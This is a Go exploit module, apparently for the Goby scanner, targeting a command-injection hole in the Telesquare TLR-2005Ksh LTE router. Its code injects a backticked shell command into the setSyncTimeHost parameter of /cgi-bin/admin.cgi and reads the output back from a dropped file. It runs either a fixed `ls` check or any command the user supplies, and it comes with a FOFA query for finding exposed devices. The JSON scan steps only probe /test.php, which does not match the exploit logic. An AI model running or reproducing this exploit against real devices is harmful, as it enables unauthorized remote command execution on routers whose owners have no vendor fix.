package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Telesquare TLR-2005Ksh setSyncTimeHost RCE",
    "Description": "<p>Telesquare Tlr-2005Ksh is a Sk Telecom LTE router produced by Telesquare Korea.</p><p>There is a security vulnerability in Telesquare TLR-2005Ksh, attackers can execute arbitrary commands through setSyncTimeHost to obtain server privileges.</p>",
    "Product": "TELESQUARE-TLR-2005KSH",
    "Homepage": "http://telesquare.co.kr/",
    "DisclosureDate": "2022-12-16",
    "Author": "corp0ra1",
    "FofaQuery": "title=\"TLR-2005KSH\" || banner=\"TLR-2005KSH login:\"",
    "GobyQuery": "title=\"TLR-2005KSH\" || banner=\"TLR-2005KSH login:\"",
    "Level": "3",
    "Impact": "<p>There is a security vulnerability in Telesquare TLR-2005Ksh, attackers can execute arbitrary commands through setSyncTimeHost to obtain server privileges.</p>",
    "Recommendation": "<p>The manufacturer has not yet released a fix to solve this security problem, please pay attention to the manufacturer's update in time: <a href=\"http://telesquare.co.kr/.\">http://telesquare.co.kr/.</a></p>",
    "References": [
        "https://github.com/splashsc/IOT_Vulnerability_Discovery/blob/main/Telesquare/1_cmdi.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Telesquare TLR-2005Ksh 路由器 setSyncTimeHost 命令执行漏洞",
            "Product": "TELESQUARE-TLR-2005KSH",
            "Description": "<p>Telesquare Tlr-2005Ksh是韩国Telesquare公司的一款 Sk 电讯 Lte 路由器。<br></p><p>Telesquare TLR-2005Ksh存在安全漏洞，攻击者可通过setSyncTimeHost执行任意命令获取服务器权限。<br></p>",
            "Recommendation": "<p>厂商暂未发布修复措施解决此安全问题，请及时关注厂商更新：<a href=\"http://telesquare.co.kr/\">http://telesquare.co.kr/</a>。<br></p>",
            "Impact": "<p>Telesquare TLR-2005Ksh存在安全漏洞，攻击者可通过setSyncTimeHost执行任意命令获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Telesquare TLR-2005Ksh setSyncTimeHost RCE",
            "Product": "TELESQUARE-TLR-2005KSH",
            "Description": "<p>Telesquare Tlr-2005Ksh is a Sk Telecom LTE router produced by Telesquare Korea.<br></p><p>There is a security vulnerability in Telesquare TLR-2005Ksh, attackers can execute arbitrary commands through setSyncTimeHost to obtain server privileges.<br></p>",
            "Recommendation": "<p>The manufacturer has not yet released a fix to solve this security problem, please pay attention to the manufacturer's update in time: <a href=\"http://telesquare.co.kr/.\">http://telesquare.co.kr/.</a><br></p>",
            "Impact": "<p>There is a security vulnerability in Telesquare TLR-2005Ksh, attackers can execute arbitrary commands through setSyncTimeHost to obtain server privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10777"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			fileName := goutils.RandomHexString(8)
			uri := "/cgi-bin/admin.cgi?Command=setSyncTimeHost&time=`ls>" + fileName + ".txt`"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "<result>success</result>") {
				uri2 := "/cgi-bin/" + fileName + ".txt"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "systemutil.cgi") && strings.Contains(resp2.RawBody, "lte.cgi")

				}

			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)

			fileName := goutils.RandomHexString(8)
			uri := "/cgi-bin/admin.cgi?Command=setSyncTimeHost&time=`" + cmd + ">" + fileName + ".txt`"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "<result>success</result>") {
				uri2 := "/cgi-bin/" + fileName + ".txt"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}

			}
			return expResult
		},
	))
}